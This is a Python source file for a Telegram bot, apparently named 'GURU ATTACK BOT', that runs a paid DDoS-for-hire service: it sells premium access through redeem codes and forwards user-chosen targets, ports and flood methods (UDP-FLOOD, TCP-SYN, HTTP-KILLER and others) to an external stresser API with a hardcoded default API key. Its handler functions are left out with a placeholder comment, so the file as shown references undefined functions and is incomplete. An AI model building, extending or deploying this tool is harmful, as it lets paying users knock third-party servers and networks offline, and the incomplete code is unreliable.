import os
import logging
import asyncio
import aiohttp
import time
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))

# CONCURRENT SETTINGS - Using a mutable container to avoid global issues
CONFIG = {
    "DEFAULT_CONCURRENT": int(os.getenv("DEFAULT_CONCURRENT", "2"))  # Changed to 2
}
MIN_CONCURRENT = 1
MAX_CONCURRENT = 8
MIN_DURATION = 30
MAX_DURATION = 300

# ATTACK METHODS - UDP-FLOOD as default
ATTACK_METHODS = [
    "UDP-FLOOD",  # DEFAULT - maps to udp-free
    "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

METHOD_MAP = {
    "UDP-FLOOD": "udp-free",  # FIXED: lowercase
    "UDP-VSE": "udp-vse", 
    "UDP-DNS": "udp-dns",
    "TCP-SYN": "tcp-syn",
    "TCP-ACK": "tcp-ack",
    "TCP-STOMP": "tcp-stomp",
    "TCP-HANDSHAKE": "tcp-handshake",
    "ICMP-FLOOD": "icmp-flood",
    "GRE-FLOOD": "gre-flood",
    "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX",
    "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER",
    "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_concurrent():
    """Get current concurrent value"""
    return CONFIG["DEFAULT_CONCURRENT"]

def set_concurrent(value):
    """Set concurrent value"""
    CONFIG["DEFAULT_CONCURRENT"] = value

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = True
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000
                )
                self.client.admin.command('ping')
                
                self.db = self.client["guru_bot"]
                self.users_col = self.db.users
                self.codes_col = self.db.redeem_codes
                self.logs_col = self.db.attack_logs
                self.admins_col = self.db.admins
                self.settings_col = self.db.settings
                
                self.users_col.create_index("user_id", unique=True)
                self.codes_col.create_index("code", unique=True)
                self.admins_col.create_index("user_id", unique=True)
                
                if not self.settings_col.find_one({"_id": "bot_settings"}):
                    self.settings_col.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                self.memory_mode = False
                logger.info("✅ MongoDB connected successfully!")
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if self.memory_mode:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id,
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }
                    return True
                return False
            else:
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False
    
    def get_user(self, user_id):
        try:
            if self.memory_mode:
                return self.users.get(user_id)
            else:
                return self.users_col.find_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            
            if plan == "free":
                return "free", None
            
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        return "premium", None
                
                if expiry and isinstance(expiry, datetime):
                    if expiry < datetime.now():
                        return "premium", expiry
                    else:
                        return "premium", expiry
                else:
                    return "premium", None
            
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
                    return True
                return False
            else:
                expiry_str = expiry.isoformat() if expiry else None
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": plan,
                        "plan_expiry": expiry_str,
                        "has_used_code": True if plan == "premium" else False
                    }}
                )
                return result.modified_count > 0 or result.matched_count > 0
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False
    
    def is_admin(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins
            else:
                return self.admins_col.find_one({"user_id": user_id}) is not None
        except:
            return False
    
    def get_admin_level(self, user_id):
        try:
            if self.memory_mode:
                return self.admins.get(user_id, {}).get("level")
            else:
                admin = self.admins_col.find_one({"user_id": user_id})
                return admin.get("level") if admin else None
        except:
            return None
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if self.is_admin(user_id):
                return False
            
            if self.memory_mode:
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                return True
            else:
                self.admins_col.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
            else:
                result = self.admins_col.delete_one({"user_id": user_id})
                return result.deleted_count > 0
        except:
            return False
    
    def get_admins(self):
        try:
            if self.memory_mode:
                return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
            else:
                return list(self.admins_col.find({}))
        except:
            return []
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = True
                    self.users[user_id]["ban_reason"] = reason
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
                )
                return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = False
                    self.users[user_id]["ban_reason"] = None
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
                )
                return True
        except:
            return False
    
    def create_code(self, code, days, created_by):
        try:
            if self.memory_mode:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
            else:
                if self.codes_col.find_one({"code": code}):
                    return False
                self.codes_col.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "used_by": None,
                    "used_at": None,
                    "is_used": False
                })
                return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False
    
    def use_code(self, code, user_id):
        try:
            if self.memory_mode:
                if code not in self.codes or self.codes[code].get("is_used"):
                    return None
                
                code_data = self.codes[code]
                code_data["is_used"] = True
                code_data["used_by"] = user_id
                code_data["used_at"] = datetime.now()
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if user_id not in self.users:
                    self.add_user(user_id)
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = expiry
                self.users[user_id]["has_used_code"] = True
                return code_data
            else:
                code_data = self.codes_col.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes_col.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if not self.get_user(user_id):
                    self.add_user(user_id)
                
                expiry_str = expiry.isoformat() if expiry else None
                
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": "premium",
                        "plan_expiry": expiry_str,
                        "has_used_code": True,
                        "code_used": code,
                        "redeem_date": datetime.now().isoformat()
                    }}
                )
                
                return code_data
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None
    
    def get_codes(self, only_unused=False):
        try:
            if self.memory_mode:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c.get("is_used")]
                return codes
            else:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes_col.find(query).sort("created_at", -1))
        except:
            return []
    
    def delete_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            else:
                result = self.codes_col.delete_one({"code": code})
                return result.deleted_count > 0
        except:
            return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            
            if self.memory_mode:
                self.logs.append(log)
            else:
                self.logs_col.insert_one(log)
            
            # Update user attack count
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$inc": {"attack_count": 1},
                     "$set": {"last_attack_time": datetime.now().isoformat(),
                              "last_attack_duration": duration}}
                )
            return True
        except:
            return False
    
    def get_total_attacks(self):
        try:
            if self.memory_mode:
                return len(self.logs)
            else:
                return self.logs_col.count_documents({})
        except:
            return 0
    
    def get_user_stats(self, user_id):
        try:
            if self.memory_mode:
                return len([l for l in self.logs if l.get("user_id") == user_id])
            else:
                return self.logs_col.count_documents({"user_id": user_id})
        except:
            return 0
    
    def get_all_users(self):
        try:
            if self.memory_mode:
                return list(self.users.values())
            else:
                return list(self.users_col.find({}))
        except:
            return []
    
    def get_pause_info(self):
        try:
            if self.memory_mode:
                return {"paused": self.settings.get("pause_all", False)}
            else:
                settings = self.settings_col.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at"),
                        "pause_reason": settings.get("pause_reason")
                    }
                return {"paused": False}
        except:
            return {"paused": False}
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if self.memory_mode:
                self.settings["pause_all"] = paused
            else:
                self.settings_col.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            return True
        except:
            return False

db = Database(MONGO_URI)

# ===== INITIALIZE OWNERS =====
def init_owners():
    try:
        owner = db.get_user(OWNER_ID)
        if not owner:
            db.add_user(OWNER_ID, "owner", "Owner")
        
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        
        plan, expiry = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")

def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
            if not pseudo_owner:
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            
            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")

init_owners()
init_pseudo_owner()

# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method, concurrent):
    """Send attack to API with proper concurrent parameter"""
    api_key = API_KEY
    api_url = API_URL
    
    if not api_key:
        return {"success": False, "error": "API Key missing"}
    
    api_method = METHOD_MAP.get(method.upper(), "udp-free")
    
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method,  # This is already lowercase (udp-free)
        "concs": str(concurrent)
    }
    
    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
        params["req_method"] = "GET"
        params["geoloc"] = "MIX"
        params["version"] = "1"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    
    logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
    logger.info(f"📡 Method: {api_method}")
    
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:200]}
                
                logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                logger.info(f"📊 Response: {response_text[:200]}")
                
                if response.status == 200 and response_data.get('status') == 'success':
                    return {
                        "success": True,
                        "elapsed": elapsed,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
                else:
                    return {
                        "success": False,
                        "error": response_data.get('message', f'HTTP {response.status}'),
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": concurrent}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:50], "concurrent": concurrent}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.is_running = False
        self.current_target = None
        self.current_user = None
        self.attack_start_time = None
        self.attack_duration = 0
        self.current_concurrent = get_concurrent()
        self.total_attacks = 0
        self.lock = asyncio.Lock()
        self.attack_task = None
        logger.info(f"🔥 Attack Manager initialized with concurrent: {get_concurrent()}")
    
    async def can_start_attack(self, user_id):
        if self.is_running:
            if self.attack_start_time:
                elapsed = (datetime.now() - self.attack_start_time).total_seconds()
                remaining = max(0, self.attack_duration - elapsed)
                return False, f"❌ ATTACK IN PROGRESS!\n\n🎯 Target: {self.current_target}\n⏱️ Remaining: {int(remaining)}s\n🔄 Concurrent: **{self.current_concurrent}**"
        
        if db.is_banned(user_id):
            return False, "❌ You are banned!"
        
        plan, expiry = db.get_user_plan(user_id)
        is_owner = db.is_owner_or_pseudo(user_id)
        is_admin = db.is_admin(user_id)
        
        if not is_owner and not is_admin and plan != "premium":
            return False, "❌ PREMIUM REQUIRED\n\nUse `/redeem CODE` to activate."
        
        if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
            return False, "❌ PLAN EXPIRED"
        
        return True, "OK"
    
    async def start_attack(self, user_id, target, port, duration, method, context, concurrent):
        async with self.lock:
            if self.is_running:
                return None, "Attack already in progress!"
            
            self.is_running = True
            self.current_target = f"{target}:{port}"
            self.current_user = user_id
            self.attack_start_time = datetime.now()
            self.attack_duration = duration
            self.current_concurrent = concurrent
            self.total_attacks += 1
            
            logger.info(f"🔥 Attack starting - User: {user_id} - Target: {target}:{port} - Concurrent: {concurrent}")
            
            self.attack_task = asyncio.create_task(
                self.execute_attack(target, port, duration, user_id, context, method, concurrent)
            )
            asyncio.create_task(self.cleanup_attack(duration))
            
            return True, f"Attack started with {concurrent} concurrent connections"
    
    async def execute_attack(self, target, port, duration, user_id, context, method, concurrent):
        try:
            result = await send_api_attack(target, port, duration, method, concurrent)
            
            db.log_attack(
                user_id, target, port, duration, method,
                "success" if result.get('success') else "failed",
                str(result.get('response', {}))[:200],
                concurrent
            )
            
            if result.get('success'):
                await context.bot.send_message(
                    user_id,
                    f"✅ *Attack Completed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏱️ Duration: `{duration}s`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"⚡ Status: SUCCESS",
                    parse_mode='Markdown'
                )
            else:
                await context.bot.send_message(
                    user_id,
                    f"❌ *Attack Failed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"❌ Error: `{result.get('error', 'Unknown error')}`",
                    parse_mode='Markdown'
                )
        except Exception as e:
            logger.error(f"❌ Attack error: {e}")
    
    async def cleanup_attack(self, duration):
        await asyncio.sleep(duration + 2)
        async with self.lock:
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = get_concurrent()
            self.attack_task = None
            logger.info("✅ Attack cleaned up")
    
    async def stop_attack(self, user_id):
        async with self.lock:
            if not self.is_running:
                return False, "No attack is running"
            
            if self.attack_task and not self.attack_task.done():
                self.attack_task.cancel()
            
            target = self.current_target
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = get_concurrent()
            self.attack_task = None
            
            return True, f"Attack on {target} stopped"
    
    def get_stats(self):
        remaining = 0
        if self.is_running and self.attack_start_time:
            elapsed = (datetime.now() - self.attack_start_time).total_seconds()
            remaining = max(0, self.attack_duration - elapsed)
        
        return {
            'is_running': self.is_running,
            'current_target': self.current_target,
            'current_user': self.current_user,
            'remaining_time': int(remaining),
            'total_attacks': self.total_attacks,
            'concurrent_value': self.current_concurrent if self.is_running else get_concurrent()
        }

attack_manager = AttackManager()

# ===== TELEGRAM HANDLERS =====
# ... (All the handlers remain the same as in the previous version)

# ===== MAIN =====
def main():
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set!")
        return
    
    print("=" * 60)
    print("🔥 GURU ATTACK BOT - UDP-FLOOD DEFAULT 🔥")
    print(f"⚡ DEFAULT CONCURRENT: {get_concurrent()}")
    print(f"📊 CONCURRENT RANGE: {MIN_CONCURRENT}-{MAX_CONCURRENT}")
    print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
    print(f"📡 Default Method: UDP-FLOOD (udp-free)")
    print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
    print("=" * 60)
    print("💡 Commands:")
    print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack")
    print("  /setconcurrent NUMBER - Change concurrent value")
    print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
    print("  /testconcs HOST PORT TIME [METHOD] - Test concurrent values")
    print("  /status - Show bot status")
    print("  /stop - Stop running attack")
    print("  /redeem CODE - Redeem premium code")
    print("=" * 60)
    
    # Create application
    bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # COMMANDS
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack_command))
    bot_app.add_handler(CommandHandler("stop", stop_command))
    bot_app.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
    bot_app.add_handler(CommandHandler("testapi", testapi_command))
    bot_app.add_handler(CommandHandler("testconcs", test_concurrents_command))
    bot_app.add_handler(CommandHandler("status", status_command))
    bot_app.add_handler(CommandHandler("redeem", redeem_command))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    
    # CALLBACK QUERY HANDLERS
    bot_app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    bot_app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    bot_app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    bot_app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    bot_app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    bot_app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    bot_app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    bot_app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    bot_app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    bot_app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    bot_app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    bot_app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    bot_app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    bot_app.add_handler(CallbackQueryHandler(owner_concurrent_callback, pattern="^owner_concurrent$"))
    bot_app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    bot_app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    bot_app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    bot_app.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
    bot_app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    # Start bot
    print("✅ Bot started! Press Ctrl+C to stop.")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()